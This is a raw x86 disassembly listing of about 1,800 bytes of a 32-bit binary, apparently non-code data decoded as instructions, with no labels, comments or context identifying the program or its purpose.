  401fac:	cmc    
  401fad:	inc    eax
  401fae:	xor    BYTE PTR [ecx],al
  401fb0:	pop    eax
  401fb1:	add    dh,BYTE PTR [edx]
  401fb3:	and    BYTE PTR ds:0x60aa03,ah
  401fb9:	adc    eax,0x54141044
  401fbe:	sub    BYTE PTR ds:0x1098450,cl
  401fc4:	xor    BYTE PTR [eax],ch
  401fc6:	fild   WORD PTR [ecx]
  401fc8:	adc    DWORD PTR [eax],eax
  401fca:	mov    DWORD PTR [ecx],ebx
  401fcc:	add    al,0x2
  401fce:	nop
  401fcf:	popa   
  401fd0:	and    BYTE PTR [ecx],0x10
  401fd3:	add    BYTE PTR [eax+0x0],al
  401fd6:	add    BYTE PTR [eax+0x0],al
  401fd9:	pusha  
  401fda:	and    DWORD PTR [eax],0x20
  401fdd:	or     BYTE PTR [eax],al
  401fdf:	or     al,0x52
  401fe1:	and    cl,BYTE PTR [eax]
  401fe3:	add    BYTE PTR [ebx],0xa0
  401fe6:	and    DWORD PTR [eax],eax
  401fe8:	adc    dl,dl
  401fea:	add    BYTE PTR [eax+ecx*1],ah
  401fed:	sub    BYTE PTR [esi],al
  401fef:	(bad)  
  401ff0:	aam    0x29
  401ff2:	inc    esp
  401ff3:	or     cl,BYTE PTR [ecx]
  401ff5:	and    BYTE PTR ds:0x60c10680,bh
  401ffb:	add    al,BYTE PTR [esp+eax*1]
  401ffe:	and    BYTE PTR [edx-0x80],ah
  402001:	or     BYTE PTR [ebx],al
  402003:	or     eax,DWORD PTR [ecx+eax*1-0x38]
  402007:	push   es
  402008:	stos   BYTE PTR es:[edi],al
  402009:	add    al,0x1
  40200b:	add    eax,0x82402c20
  402010:	mov    ch,0x11
  402012:	mov    ds:0x52492400,al
  402017:	inc    eax
  402018:	add    DWORD PTR [ecx],eax
  40201a:	add    eax,0x834122
  40201f:	or     eax,DWORD PTR [edx+ebp*1+0x926210]
  402026:	and    dl,BYTE PTR [ebp+0x300142eb]
  40202c:	add    al,BYTE PTR [eax+0x0]
  40202f:	add    BYTE PTR [ecx-0x6ffffbfc],0x4a
  402036:	add    BYTE PTR [eax],al
  402038:	and    BYTE PTR es:0x52010964,0x5
  402040:	add    al,0xf2
  402042:	(bad)  
  402043:	push   cs
  402044:	push   0x18908001
  402049:	imul   esp,DWORD PTR [eax+0x240608c8],0x20088418
  402053:	add    ecx,DWORD PTR [edx]
  402055:	add    BYTE PTR [edx-0x5f],cl
  402058:	add    eax,0x22403239
  40205d:	push   es
  40205e:	or     BYTE PTR [eax+0x312c0425],al
  402064:	ficom  WORD PTR ds:0x34400402
  40206a:	or     BYTE PTR [eax+0x32010052],0x18
  402071:	sub    eax,0xbc018047
  402076:	nop
  402077:	add    al,BYTE PTR [eax]
  402079:	and    BYTE PTR [ebp+0x90d0000],dl
  40207f:	add    BYTE PTR [ecx],ah
  402081:	inc    eax
  402082:	adc    BYTE PTR [eax+0x4],al
  402085:	and    BYTE PTR [eax+0x530c1225],al
  40208b:	add    BYTE PTR [eax],dl
  40208d:	sbb    DWORD PTR [edx],ecx
  40208f:	push   esp
  402090:	add    al,BYTE PTR [ecx+eiz*4]
  402093:	xor    ah,0x44
  402096:	adc    al,BYTE PTR [esp+eax*1]
  402099:	pop    eax
  40209a:	and    DWORD PTR es:[ecx],edx
  40209d:	add    BYTE PTR [eax],cl
  40209f:	bound  eax,QWORD PTR [eax]
  4020a1:	mov    DWORD PTR [edx],ebp
  4020a3:	sub    BYTE PTR [eax],dh
  4020a5:	loope  0x402047
  4020a7:	add    BYTE PTR [ecx+0x20224400],dl
  4020ad:	add    al,0xab
  4020af:	adc    BYTE PTR [esi],ah
  4020b1:	dec    edx
  4020b2:	add    al,0x4d
  4020b4:	add    DWORD PTR [esp+eax*4+0x8],eax
  4020b8:	add    BYTE PTR [eax+0x40],ah
  4020bb:	add    al,0x10
  4020bd:	adc    BYTE PTR [edx],bl
  4020bf:	add    DWORD PTR [ecx+0x2032c40],eax
  4020c5:	inc    ebp
  4020c6:	or     dl,BYTE PTR [ecx]
  4020c8:	and    al,0x92
  4020ca:	adc    DWORD PTR ds:0xd42308c9,eax
  4020d0:	mov    al,ds:0xd450ae0
  4020d5:	add    BYTE PTR [edx+ecx*1],ah
  4020d8:	or     BYTE PTR [eax],ah
  4020da:	jo     0x40214c
  4020dc:	add    BYTE PTR [edx+edx*4+0x14a0600],al
  4020e3:	add    BYTE PTR [eax-0x1fba6d00],0x70
  4020ea:	add    eax,0x588501
  4020ef:	jmp    0x81692cf4
  4020f4:	or     al,0x40
  4020f6:	or     BYTE PTR [ecx],cl
  4020f8:	add    BYTE PTR [ecx],al
  4020fa:	or     BYTE PTR [eax],al
  4020fc:	or     BYTE PTR [eax],cl
  4020fe:	inc    edx
  4020ff:	sub    al,0x22
  402101:	mov    dh,0x80
  402103:	xchg   ebp,eax
  402104:	add    DWORD PTR [ecx],0x85211d00
  40210a:	adc    al,BYTE PTR [edx]
  40210c:	adc    BYTE PTR ds:0x21400002,dl
  402112:	add    BYTE PTR [eax-0x3c],ah
  402115:	ret    0xbf03
  402118:	add    BYTE PTR [eax+0xa],ch
  40211b:	add    ah,al
  40211d:	add    DWORD PTR [edx],ebx
  40211f:	add    BYTE PTR [eax],dl
  402121:	and    BYTE PTR [ebx+0x8],0xd
  402125:	inc    ecx
  402126:	pop    eax
  402127:	adc    al,cl
  402129:	add    ecx,DWORD PTR [eax]
  40212b:	mov    al,ds:0x40044794
  402130:	pushf  
  402131:	adc    BYTE PTR [esi+ecx*1+0x30],bl
  402135:	add    BYTE PTR [eax],cl
  402137:	inc    edx
  402138:	inc    esp
  402139:	add    al,BYTE PTR [ebx+0x39]
  40213c:	inc    eax
  40213d:	and    BYTE PTR ds:0x18800200,ch
  402143:	add    al,0x90
  402145:	add    BYTE PTR [edi+0x41006750],0x91
  40214c:	pusha  
  40214d:	add    al,0x86
  40214f:	adc    BYTE PTR [eax+eax*1],cl
  402152:	adc    al,0x82
  402154:	or     al,0x0
  402156:	dec    edx
  402157:	add    BYTE PTR [edx],al
  402159:	or     al,al
  40215b:	or     BYTE PTR [ecx],0x2
  40215e:	mov    bl,0x45
  402160:	add    BYTE PTR [eax],al
  402162:	pop    ds
  402163:	xor    esp,DWORD PTR [eax]
  402165:	jmp    0x5040548a
  40216a:	pop    es
  40216b:	add    ebx,DWORD PTR [edx-0x5f9abf7e]
  402171:	add    al,0x41
  402173:	add    BYTE PTR [eax],bl
  402175:	or     eax,DWORD PTR [ecx]
  402177:	and    BYTE PTR [edx+edx*1],al
  40217a:	adc    BYTE PTR [eax-0x7ffd7d96],al
  402180:	inc    edx
  402181:	sub    BYTE PTR [esi+0x10058348],ah
  402187:	add    BYTE PTR [edx+eiz*4],bh
  40218a:	loopne 0x40218e
  40218c:	inc    edx
  40218d:	ror    DWORD PTR [ebx],0x85
  402190:	adc    al,0xc8
  402192:	add    BYTE PTR [eax],al
  402194:	add    DWORD PTR [ecx],eax
  402196:	and    BYTE PTR ds:0x647120,al
  40219c:	add    eax,DWORD PTR [edi+0x40438480]
  4021a2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4021a4:	add    BYTE PTR [eax+0x4],cl
  4021a7:	add    BYTE PTR [eax+0x1893e02a],cl
  4021ad:	or     BYTE PTR [eax],0x10
  4021b0:	ret    0x4260
  4021b3:	add    BYTE PTR [eax-0x18fede8c],al
  4021b9:	inc    eax
  4021ba:	add    al,0x4a
  4021bc:	add    BYTE PTR [edx],al
  4021be:	adc    DWORD PTR [eax-0x7b],0x44038366
  4021c5:	cmp    eax,0x70405001
  4021ca:	sub    al,0x4b
  4021cc:	or     BYTE PTR [eax+edi*1],al
  4021cf:	retf   0x290
  4021d2:	add    BYTE PTR [ecx+0x441a0e0],0x8c
  4021d9:	mov    WORD PTR [eax],ds
  4021db:	rol    DWORD PTR [eax+esi*4+0x3],1
  4021df:	add    BYTE PTR [eax+eax*2-0x7bffff00],al
  4021e6:	add    DWORD PTR [ecx+0x9099f62],esi
  4021ec:	and    al,0xa
  4021ee:	and    al,0x3
  4021f0:	and    DWORD PTR [eax+edx*1+0x28500609],ecx
  4021f7:	mov    DWORD PTR [edx-0x80],ecx
  4021fa:	pusha  
  4021fb:	dec    esp
  4021fc:	add    DWORD PTR [eax+0x10424119],eax
  402202:	xor    BYTE PTR [eax+0x4a1c0575],al
  402208:	adc    BYTE PTR [esi],dh
  40220a:	add    BYTE PTR [ecx-0x70],ah
  40220d:	and    BYTE PTR [eax],cl
  40220f:	test   DWORD PTR [ecx+edx*1],esp
  402212:	or     BYTE PTR [ecx],0x44
  402215:	inc    eax
  402216:	stos   BYTE PTR es:[edi],al
  402217:	or     cl,BYTE PTR [esi]
  402219:	inc    eax
  40221a:	inc    eax
  40221b:	adc    BYTE PTR ds:0x9200460,dh
  402221:	add    DWORD PTR [edx+0x2000311],esp
  402227:	test   BYTE PTR [eax],dl
  402229:	adc    dl,BYTE PTR [ebx]
  40222b:	and    BYTE PTR [esi+0x0],cl
  40222e:	add    DWORD PTR [eax+0x2],eax
  402231:	inc    ebx
  402232:	push   esp
  402233:	add    ecx,DWORD PTR [ecx]
  402235:	or     al,0x24
  402237:	dec    eax
  402238:	add    al,0x26
  40223a:	adc    BYTE PTR [edx+0x27021104],0x0
  402241:	add    al,0x10
  402243:	pop    eax
  402244:	inc    eax
  402245:	add    BYTE PTR [eax+0x11],dl
  402248:	and    BYTE PTR [eax+0x0],al
  40224b:	add    al,BYTE PTR [edx+0x202a9846]
  402251:	adc    al,al
  402253:	adc    dl,BYTE PTR [esi+0x20c4100]
  402259:	and    al,BYTE PTR [edx+eax*4+0x780869be]
  402260:	mov    DWORD PTR [ecx],0x249020a3
  402266:	sub    ah,BYTE PTR [eax+0x42]
  402269:	add    BYTE PTR [eax],al
  40226b:	add    DWORD PTR [edx+0x3030b402],esi
  402271:	mov    dh,0xe0
  402273:	add    al,0x8
  402275:	mov    al,ds:0x10800c14
  40227a:	or     BYTE PTR [esi+0x7210154],al
  402280:	mov    eax,ds:0x12000235
  402285:	push   ss
  402286:	add    BYTE PTR [edx],dl
  402288:	inc    eax
  402289:	adc    al,BYTE PTR [eax]
  40228b:	push   es
  40228c:	and    al,0x52
  40228e:	rol    DWORD PTR [eax],cl
  402290:	add    eax,0x6290284
  402295:	test   al,0x40
  402297:	inc    edx
  402298:	add    dl,BYTE PTR [ecx]
  40229a:	or     DWORD PTR [ecx+eax*1+0x61],ebp
  40229e:	dec    ebx
  40229f:	inc    esi
  4022a0:	and    BYTE PTR [eax],al
  4022a2:	xor    al,BYTE PTR [eax+0x1]
  4022a5:	add    BYTE PTR [ecx],0xa6
  4022a8:	add    DWORD PTR [eax-0x70],ecx
  4022ab:	add    BYTE PTR [esi],dl
  4022ad:	bound  esp,QWORD PTR [eax]
  4022af:	add    BYTE PTR [ebx+eax*1],0xe0
  4022b3:	mov    BYTE PTR [eax],ch
  4022b5:	mov    eax,ds:0xa4d131a4
  4022ba:	or     BYTE PTR [edx],0x8
  4022bd:	adc    dl,BYTE PTR [eax]
  4022bf:	test   BYTE PTR [edx],al
  4022c1:	popa   
  4022c2:	and    BYTE PTR [eax+0x2200100],0x30
  4022c9:	or     BYTE PTR [eax],ah
  4022cb:	add    BYTE PTR [edx],bh
  4022cd:	sub    BYTE PTR [eax-0x7c],al
  4022d0:	add    BYTE PTR [edx-0x80],ah
  4022d3:	add    al,0x1
  4022d5:	add    BYTE PTR [eax],0x1
  4022d8:	adc    al,BYTE PTR [esi-0x5aef4fef]
  4022de:	xor    BYTE PTR [eax+ebp*1],0xc5
  4022e2:	xor    BYTE PTR [edx],al
  4022e4:	add    BYTE PTR [eax+0x21],al
  4022e7:	add    DWORD PTR [eax+0x5],eax
  4022ea:	and    al,0xc0
  4022ec:	inc    eax
  4022ed:	add    BYTE PTR [ecx],al
  4022ef:	add    BYTE PTR [esi],ah
  4022f1:	adc    al,BYTE PTR [edi+0x41]
  4022f4:	add    ch,BYTE PTR [edx]
  4022f6:	ror    BYTE PTR [eax],0x14
  4022f9:	add    BYTE PTR [eax],al
  4022fb:	pusha  
  4022fc:	or     cl,BYTE PTR [ecx]
  4022fe:	sbb    al,0x21
  402300:	push   ss
  402301:	add    BYTE PTR [edx],ah
  402303:	and    BYTE PTR [eax],al
  402305:	adc    BYTE PTR [edx],al
  402307:	add    eax,0x4801
  40230c:	adc    DWORD PTR [edx+edx*1+0x21],0x73
  402311:	add    eax,0x22410100
  402316:	xor    BYTE PTR [ecx-0x7fffff10],bl
  40231c:	add    BYTE PTR [ecx],0x85
  40231f:	adc    BYTE PTR [esi+edx*8+0x41331408],dl
  402326:	inc    eax
  402327:	and    al,BYTE PTR [eax-0x533fdf00]
  40232d:	and    BYTE PTR [eax],ah
  40232f:	add    BYTE PTR [esi],0xc
  402332:	inc    eax
  402333:	dec    eax
  402334:	mov    bl,0x1
  402336:	mov    BYTE PTR [esi],al
  402338:	cmp    al,BYTE PTR [eax]
  40233a:	add    al,BYTE PTR fs:[eax-0x7f]
  40233e:	add    BYTE PTR [esi],ah
  402340:	add    BYTE PTR [eax+0x0],bh
  402343:	xor    BYTE PTR [eax],ah
  402345:	or     DWORD PTR [eax+0x246a08],edx
  40234b:	add    al,0x0
  40234d:	inc    sp
  40234f:	add    DWORD PTR [edx],edi
  402351:	add    BYTE PTR [eax+ebx*1+0x9],al
  402355:	add    al,BYTE PTR [edx]
  402357:	dec    esi
  402358:	and    bl,BYTE PTR [edx-0x3dbdefbe]
  40235e:	sbb    BYTE PTR [eax],ah
  402360:	push   eax
  402361:	or     DWORD PTR [ebx+0x582a8060],ecx
  402367:	and    eax,0xe8008
  40236c:	or     BYTE PTR [eax],0x18
  40236f:	xor    BYTE PTR [eax+eax*4+0x421477],al
  402376:	cmp    dl,BYTE PTR [eax]
  402378:	push   es
  402379:	and    BYTE PTR [edx],al
  40237b:	add    al,0x52
  40237d:	add    BYTE PTR [ecx+ecx*1],cl
  402380:	call   0xc40:0x210e4252
  402387:	adc    BYTE PTR [eax-0x3c],cl
  40238a:	and    edx,DWORD PTR [eax-0x5f7eb780]
  402390:	xor    BYTE PTR ds:0x900d04,al
  402396:	or     al,0xc8
  402398:	and    BYTE PTR [eax],bl
  40239a:	and    BYTE PTR [eax],0x84
  40239d:	and    BYTE PTR [eax+eiz*2+0x6aa10002],cl
  4023a4:	add    dh,BYTE PTR [edx]
  4023a6:	sbb    dl,BYTE PTR [eax+0x110000e0]
  4023ac:	add    al,BYTE PTR [eax]
  4023ae:	or     BYTE PTR [edi+0x4],cl
  4023b1:	add    al,0x18
  4023b3:	or     DWORD PTR [edx+0x10210902],esp
  4023b9:	add    al,0x28
  4023bb:	and    BYTE PTR [ecx],al
  4023bd:	xor    esp,0x1a
  4023c0:	mov    BYTE PTR [edx+0x2588da5],ah
  4023c6:	inc    esp
  4023c7:	adc    BYTE PTR [eax],cl
  4023c9:	sub    BYTE PTR [ebx],dl
  4023cb:	nop
  4023cc:	inc    esp
  4023cd:	mov    al,ds:0x2810024
  4023d2:	add    DWORD PTR [ebx],edx
  4023d4:	add    al,0xb0
  4023d6:	xor    BYTE PTR [ecx],al
  4023d8:	and    BYTE PTR [edx+0x78],al
  4023db:	push   ecx
  4023dc:	push   es
  4023dd:	adc    DWORD PTR [esi],esp
  4023df:	push   ss
  4023e0:	add    BYTE PTR [eax],0xd0
  4023e3:	add    BYTE PTR [eax+0x2064713d],al
  4023e9:	or     ah,BYTE PTR [ecx]
  4023eb:	adc    al,0x94
  4023ed:	add    DWORD PTR [ecx],ecx
  4023ef:	lea    ecx,[eax+eax*2]
  4023f2:	dec    eax
  4023f3:	inc    ecx
  4023f4:	adc    dh,BYTE PTR [esi]
  4023f6:	and    BYTE PTR [ecx-0x4eebfef8],al
  4023fc:	inc    edx
  4023fd:	add    al,BYTE PTR fs:[ebx+0x209]
  402404:	add    BYTE PTR [edx-0x5c],0x62
  402408:	add    BYTE PTR [eax+0xd4430a],al
  40240e:	xor    DWORD PTR [eax],edx
  402410:	add    BYTE PTR [eax+0xc],bl
  402413:	inc    esp
  402414:	imul   edx,DWORD PTR [eax],0x9241c010
  40241a:	or     BYTE PTR [eax+eax*1],al
  40241d:	add    BYTE PTR [eax+0x18],cl
  402420:	ret    0x1401
  402423:	or     BYTE PTR [eax],ah
  402425:	and    al,0xb1
  402427:	and    BYTE PTR [ebx+eax*1],0xe
  40242b:	xchg   ecx,eax
  40242c:	or     BYTE PTR [edx],0x80
  40242f:	shl    DWORD PTR [edx],1
  402431:	add    BYTE PTR [eax-0x59f9aebe],bh
  402437:	add    BYTE PTR [eax],bh
  402439:	inc    ebx
  40243a:	sbb    ah,ch
  40243c:	add    ecx,DWORD PTR [eax+0x2c5b084]
  402442:	or     al,0x48
  402444:	mov    al,BYTE PTR [ecx-0x60]
  402447:	mov    esp,DWORD PTR [ecx]
  402449:	add    BYTE PTR [edx+eax*2],al
  40244c:	fst    DWORD PTR [ecx]
  40244e:	rcl    BYTE PTR [eax],1
  402450:	xchg   esi,eax
  402451:	add    esp,DWORD PTR [edx]
  402453:	adc    BYTE PTR [esi+ecx*1],dl
  402456:	add    BYTE PTR [edx+eax*1],al
  402459:	or     BYTE PTR [eax+edx*1],cl
  40245c:	test   BYTE PTR [ebp-0x60],ah
  40245f:	daa    
  402460:	(bad)  
  402461:	addr16 sub al,0x14
  402464:	add    BYTE PTR [eax+0x0],cl
  402467:	xor    eax,ebx
  402469:	and    eax,0x82262
  40246e:	add    DWORD PTR [ebx],eax
  402470:	xor    eax,0x60180d5a
  402475:	adc    al,0x5
  402477:	test   al,0x49
  402479:	or     al,0x0
  40247b:	shl    BYTE PTR ds:0xd980026a,0x0
  402482:	add    DWORD PTR [esi],esp
  402484:	or     BYTE PTR [edx],al
  402486:	add    bl,al
  402488:	inc    ebp
  402489:	dec    esp
  40248a:	adc    DWORD PTR [edx],eax
  40248c:	dec    eax
  40248d:	add    DWORD PTR [ecx],eax
  40248f:	add    eax,0xc0b74098
  402494:	test   BYTE PTR [eax],bl
  402496:	add    al,0x2e
  402498:	add    DWORD PTR [edx],0x420582
  40249e:	mov    ah,0xce
  4024a0:	mov    al,ds:0x103f08d8
  4024a5:	add    BYTE PTR [edx],al
  4024a7:	add    al,ch
  4024a9:	sbb    BYTE PTR [eax],ah
  4024ab:	rol    DWORD PTR [eax+0x50],1
  4024ae:	add    eax,DWORD PTR [ebp+0x140124]
  4024b4:	or     al,0x70
  4024b6:	and    al,BYTE PTR [edx]
  4024b8:	adc    BYTE PTR [esi],0x1c
  4024bb:	add    BYTE PTR [eax],dl
  4024bd:	add    BYTE PTR [eax],cl
  4024bf:	push   cs
  4024c0:	adc    BYTE PTR [eax],ah
  4024c2:	push   esp
  4024c3:	or     BYTE PTR [eax],al
  4024c5:	or     BYTE PTR [edx],al
  4024c7:	popa   
  4024c8:	inc    eax
  4024c9:	into   
  4024ca:	rcl    BYTE PTR [edx],1
  4024cc:	or     BYTE PTR [edx-0x35feb3b0],dl
  4024d2:	xor    BYTE PTR [edx],cl
  4024d4:	adc    BYTE PTR [ebx],dl
  4024d6:	sbb    esp,DWORD PTR [ecx]
  4024d8:	and    BYTE PTR [eax],0x0
  4024db:	and    DWORD PTR [edi+0x3],0x252c08
  4024e2:	or     DWORD PTR [edx+0x2],eax
  4024e5:	add    BYTE PTR [ebx+0x1],dl
  4024e8:	and    BYTE PTR [eax],al
  4024ea:	xor    BYTE PTR ds:0x42a48801,dl
  4024f0:	leave  
  4024f1:	adc    BYTE PTR [edx],al
  4024f3:	add    al,BYTE PTR es:[ecx]
  4024f6:	xchg   ebp,eax
  4024f7:	adc    edx,DWORD PTR [eax+0x0]
  4024fa:	adc    BYTE PTR [ebx+0x10407940],al
  402500:	and    BYTE PTR [eax],0x1
  402503:	add    eax,eax
  402505:	ins    BYTE PTR es:[edi],dx
  402506:	adc    BYTE PTR [eax+0x4],bl
  402509:	add    BYTE PTR [eax],dl
  40250b:	add    BYTE PTR [edx],al
  40250d:	rol    BYTE PTR [eax-0x7e],0x2
  402511:	and    DWORD PTR [esi],ecx
  402513:	or     BYTE PTR [esp+eax*4],ah
  402516:	and    BYTE PTR [edx+0x50],ah
  402519:	inc    ecx
  40251a:	inc    ecx
  40251b:	and    BYTE PTR [eax],ah
  40251d:	sub    al,0x2
  40251f:	mov    ds:0x22800201,al
  402524:	inc    eax
  402525:	adc    BYTE PTR [ebx],cl
  402527:	inc    esi
  402528:	inc    edx
  402529:	add    dl,0x0
  40252c:	adc    BYTE PTR [eax-0x6fe597c0],al
  402532:	add    DWORD PTR [edx+0x450c02c4],esp
  402538:	inc    eax
  402539:	add    DWORD PTR [edx+esi*4+0x47061308],esp
  402540:	adc    BYTE PTR [eax],bl
  402542:	add    BYTE PTR [eax],al
  402544:	adc    al,0xa
  402546:	mov    DWORD PTR [eax],eax
  402548:	sbb    DWORD PTR [ebx+0x20350018],0x4
  40254f:	mov    al,ds:0x84448
  402554:	inc    edx
  402555:	push   edx
  402556:	fs mov al,al
  402559:	add    BYTE PTR [edx],ah
  40255b:	add    al,0x0
  40255d:	add    BYTE PTR [edx],al
  40255f:	aad    0x15
  402561:	loopne 0x40254b
  402563:	je     0x4025af
  402565:	or     DWORD PTR [eax-0x3a],esp
  402568:	add    BYTE PTR [esi+0x45b50184],0x46
  40256f:	and    eax,0x4522940c
  402574:	push   es
  402575:	push   es
  402576:	add    BYTE PTR [ecx],dl
  402578:	mov    ah,BYTE PTR [edx+eax*1]
  40257b:	inc    esp
  40257c:	inc    edx
  40257d:	adc    BYTE PTR [edx],al
  40257f:	add    al,BYTE PTR [eax-0x6ffb5780]
  402585:	add    BYTE PTR [ebx+0x2a690800],bh
  40258b:	les    eax,FWORD PTR [eax+0x2808021]
  402591:	push   esp
  402592:	jge    0x402595
  402594:	push   ecx
  402595:	or     BYTE PTR [edx],al
  402597:	push   ds
  402598:	and    al,0x40
  40259a:	clc    
  40259b:	add    BYTE PTR [edx],dh
  40259d:	add    eax,DWORD PTR [ecx+0x22983508]
  4025a3:	sbb    BYTE PTR [edx],cl
  4025a5:	add    eax,0x42148068
  4025aa:	add    DWORD PTR [edx],0xffffff80
  4025ad:	and    esp,DWORD PTR [ecx]
  4025af:	push   es
  4025b0:	add    BYTE PTR [esi*2+0x9820020],cl
  4025b7:	add    al,BYTE PTR [esi+ecx*4+0x24712000]
  4025be:	jno    0x402542
  4025c0:	sub    al,ah
  4025c2:	and    BYTE PTR [eax+0x4c208002],al
  4025c8:	add    BYTE PTR [esi],dl
  4025ca:	add    BYTE PTR [eax+0x12023112],ah
  4025d0:	add    BYTE PTR [eax],dl
  4025d2:	pusha  
  4025d3:	add    al,0x49
  4025d5:	inc    esp
  4025d6:	mov    BYTE PTR [esi+ecx*2],dl
  4025d9:	nop
  4025da:	add    eax,0x35a8420
  4025df:	add    edx,DWORD PTR [edi]
  4025e1:	add    al,0x0
  4025e3:	sbb    BYTE PTR [ecx+0x2b29008],ah
  4025e9:	push   esp
  4025ea:	add    dh,BYTE PTR [edx+0x26]
  4025ed:	push   esp
  4025ee:	sub    ecx,DWORD PTR [eax+0x480c3]
  4025f4:	pop    es
  4025f5:	push   eax
  4025f6:	and    ecx,DWORD PTR ds:0x59466020
  4025fc:	loopne 0x4025be
  4025fe:	dec    eax
  4025ff:	add    BYTE PTR [esp+edx*8+0x10164208],dl
  402606:	mov    al,ds:0x888b231
  40260b:	or     BYTE PTR [eax],0x20
  40260e:	mov    DWORD PTR [eiz*1+0x44852000],ecx
  402615:	adc    DWORD PTR [edx],edx
  402617:	add    al,0x28
  402619:	add    edx,DWORD PTR [eax]
  40261b:	or     al,BYTE PTR [esi]
  40261d:	mov    al,ds:0x42020340
  402622:	add    al,0xa6
  402624:	adc    al,BYTE PTR [ebx]
  402626:	sbb    al,BYTE PTR [edx]
  402628:	add    BYTE PTR [ecx+eax*2],al
  40262b:	add    al,0x50
  40262d:	inc    eax
  40262e:	add    DWORD PTR [edx+0x8],ebx
  402631:	add    BYTE PTR [edx+0x31],al
  402634:	add    BYTE PTR [eax+0x40000027],al
  40263a:	add    bh,BYTE PTR [eax+0xb548402]
  402640:	adc    BYTE PTR [ecx],al
  402642:	cmp    BYTE PTR [eax+0x4500042],al
  402648:	pop    eax
  402649:	xor    BYTE PTR [ecx-0x80],al
  40264c:	add    cl,BYTE PTR [ecx]
  40264e:	and    DWORD PTR [ebp+0x40284015],esp
  402654:	adc    BYTE PTR [esp+eax*1-0x18fdf7ef],al
  40265b:	add    BYTE PTR [eax+0x40002446],dl
  402661:	outs   dx,BYTE PTR ds:[esi]
  402662:	nop
  402663:	add    BYTE PTR [edx],ah
  402665:	add    BYTE PTR [ebx],al
  402667:	adc    al,0x4d
  402669:	dec    eax
  40266a:	add    BYTE PTR [ecx],dl
  40266c:	enter  0x2601,0x5
  402670:	or     al,0x93
  402672:	fild   WORD PTR [edx-0x77fef988]
  402678:	xchg   DWORD PTR [eax+0x50050c04],eax
  40267e:	inc    eax
  40267f:	add    eax,DWORD PTR [eax]
  402681:	add    BYTE PTR [eax+ecx*1-0x7ddffdf8],al
  402688:	or     ch,al
  40268a:	add    eax,0xd6048b0a
  40268f:	dec    ebx
  402690:	cmove  esi,DWORD PTR [ebx]
  402693:	in     al,0x90
  402695:	push   es
  402696:	add    cl,BYTE PTR [eax-0x70]
  402699:	and    ah,0x27
  40269c:	or     cl,al
  40269e:	sub    edx,eax
  4026a0:	adc    DWORD PTR [eax],esi
  4026a2:	sub    eax,DWORD PTR [edx-0x7e]
  4026a5:	add    BYTE PTR [eax],ah
  4026a7:	and    edx,DWORD PTR [ecx]
  4026a9:	add    esp,esp
  4026ab:	add    eax,0x17788402
  4026b0:	inc    esi
  4026b1:	add    ah,bh
  4026b3:	and    al,0x18
  4026b5:	adc    BYTE PTR [ecx+0x42000406],al
  4026bb:	mov    BYTE PTR [ecx],al
  4026bd:	popf   
  4026be:	or     BYTE PTR [eax],ah
  4026c0:	add    al,BYTE PTR [eax]
  4026c2:	jo     0x4026cc
  4026c4:	xor    DWORD PTR [eax],0x82006012
  4026ca:	or     BYTE PTR [edx-0x80],0x0
  4026ce:	ret    
  4026cf:	add    DWORD PTR [eax],ecx
  4026d1:	mov    al,0x20
  4026d3:	sbb    eax,0x690824d0
  4026d8:	or     DWORD PTR ds:0x5c2c000,esp
  4026de:	dec    eax
  4026df:	or     BYTE PTR [esi],dl
  4026e1:	xchg   BYTE PTR [edx+eax*2],bl
  4026e4:	xor    ah,al
  4026e6:	add    BYTE PTR [eax+eiz*1+0x0],dl
  4026ea:	or     BYTE PTR ds:0x8400008,ah
  4026f0:	sbb    DWORD PTR [edx],0x4008f888
  4026f6:	add    BYTE PTR [esi+0x50],cl
  4026f9:	add    eax,DWORD PTR [eax]
  4026fb:	adc    al,0xc
  4026fd:	add    BYTE PTR [eax-0x37a55b40],cl
  402703:	add    al,BYTE PTR [edx+0x38]
  402706:	or     cl,BYTE PTR [edx-0x3d7ac5c0]
  40270c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40270d:	or     BYTE PTR [edx+eiz*8+0x4a2268],al
  402714:	add    al,0x40
  402716:	nop
  402717:	aam    0x40
  402719:	daa    
  40271a:	and    al,BYTE PTR [edx+0x50]
  40271d:	add    BYTE PTR [eax],al
  40271f:	mov    eax,ds:0x38a88000
  402724:	mov    eax,ds:0x200008
  402729:	adc    BYTE PTR [esp+edx*8],al
  40272c:	and    BYTE PTR [eax],ah
  40272e:	add    al,0x80
  402730:	mov    DWORD PTR [ecx],ebp
  402732:	inc    ecx
  402733:	adc    BYTE PTR [eax+eax*4],al
  402736:	or     al,0x96
  402738:	add    al,BYTE PTR [eax+0x20a01930]
  40273e:	add    BYTE PTR [eax+0x8408c00],0xc4
  402745:	mov    BYTE PTR [eax+0xa084b1],ah
  40274b:	inc    esp
  40274c:	add    BYTE PTR [eax],al
  40274e:	add    DWORD PTR [eax+0x1c452400],0x28
  402755:	cmp    BYTE PTR [eax+edx*4],ah
  402758:	sub    BYTE PTR [eax+0x1],0x8
  40275c:	adc    BYTE PTR [eax],0x2
  40275f:	fwait
  402760:	add    DWORD PTR es:[eax],eax
  402763:	inc    eax
  402764:	xchg   edx,eax
  402765:	add    ch,BYTE PTR [ecx+0x2c10b9a0]
  40276b:	add    al,0x20
  40276d:	test   al,0xec
  40276f:	dec    edx
  402770:	sbb    al,0x45
  402772:	lock add ebx,edx
  402775:	add    DWORD PTR [eax+0x28400840],eax
  40277b:	inc    eax
  40277c:	call   DWORD PTR ds:0x4350fc
  402782:	add    ah,al
  402784:	add    BYTE PTR [eax],cl
  402786:	test   al,0x84
  402788:	ret    0x1802
  40278b:	inc    eax
  40278c:	and    ebx,DWORD PTR [edx]
  40278e:	or     BYTE PTR [ecx+0x80a0002],cl
  402794:	add    DWORD PTR [edx],eax
  402796:	add    BYTE PTR [ecx+0x10],al
  402799:	mov    ch,bl
  40279b:	cmp    bl,BYTE PTR ds:0x6c40c840
  4027a1:	or     bl,al
  4027a3:	adc    al,BYTE PTR [eax]
  4027a5:	or     al,0x20
  4027a7:	add    BYTE PTR [eax+0x7],al
  4027aa:	add    al,0x0
  4027ac:	push   ecx
  4027ad:	mov    ds:0x20020e48,eax
  4027b2:	pusha  
  4027b3:	xchg   esp,eax
  4027b4:	add    al,BYTE PTR [ecx+0x64]
  4027b7:	push   eax
  4027b8:	adc    al,0x11
  4027ba:	inc    eax
  4027bb:	push   eax
  4027bc:	and    eax,DWORD PTR [eax]
  4027be:	add    BYTE PTR [edx+0x34],al
  4027c1:	add    al,BYTE PTR [eax+ecx*1]
  4027c4:	pusha  
  4027c5:	inc    eax
